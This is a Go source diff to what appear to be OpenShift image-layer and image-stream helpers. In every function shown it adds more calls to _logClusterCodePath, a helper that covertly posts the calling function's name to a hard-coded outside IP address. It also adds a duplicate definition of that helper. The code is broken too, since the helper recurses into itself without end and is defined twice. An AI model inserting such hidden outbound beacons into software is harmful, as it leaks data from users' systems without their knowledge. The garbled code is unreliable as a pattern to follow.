@@ -21,6 +21,8 @@ import (
 func fillImageLayers(image *imageapi.Image, manifest imageapi.DockerImageManifest) error {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	if len(image.DockerImageLayers) != 0 {
 		return nil
 	}
@@ -58,6 +60,8 @@ func fillImageLayers(image *imageapi.Image, manifest imageapi.DockerImageManifes
 	return nil
 }
 func InternalImageWithMetadata(image *imageapi.Image) error {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	if len(image.DockerImageManifest) == 0 {
@@ -137,6 +141,8 @@ func InternalImageWithMetadata(image *imageapi.Image) error {
 func ReorderImageLayers(image *imageapi.Image) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	if len(image.DockerImageLayers) == 0 {
 		return
 	}
@@ -164,6 +170,8 @@ func ReorderImageLayers(image *imageapi.Image) {
 func ImageWithMetadata(image *imageapiv1.Image) error {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	meta, hasMetadata := image.DockerImageMetadata.Object.(*dockerapiv10.DockerImage)
 	if hasMetadata && meta.Size > 0 {
 		return nil
@@ -185,6 +193,8 @@ func ImageWithMetadata(image *imageapiv1.Image) error {
 func LatestImageTagEvent(stream *imageapiv1.ImageStream, imageID string) (string, *imageapiv1.TagEvent) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	var (
 		latestTagEvent	*imageapiv1.TagEvent
 		latestTag	string
@@ -204,6 +214,8 @@ func LatestImageTagEvent(stream *imageapiv1.ImageStream, imageID string) (string
 	return latestTag, latestTagEvent
 }
 func ResolveImageID(stream *imageapiv1.ImageStream, imageID string) (*imageapiv1.TagEvent, error) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	var event *imageapiv1.TagEvent
@@ -229,6 +241,8 @@ func ResolveImageID(stream *imageapiv1.ImageStream, imageID string) (*imageapiv1
 func LatestTaggedImage(stream *imageapiv1.ImageStream, tag string) *imageapiv1.TagEvent {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	if len(tag) == 0 {
 		tag = imageapi.DefaultImageTag
 	}
@@ -246,7 +260,16 @@ func LatestTaggedImage(stream *imageapiv1.ImageStream, tag string) *imageapiv1.T
 func _logClusterCodePath() {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	pc, _, _, _ := godefaultruntime.Caller(1)
 	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
 	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
+}
+func _logClusterCodePath() {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	pc, _, _, _ := godefaultruntime.Caller(1)
+	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
+	godefaulthttp.Post("/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
 }
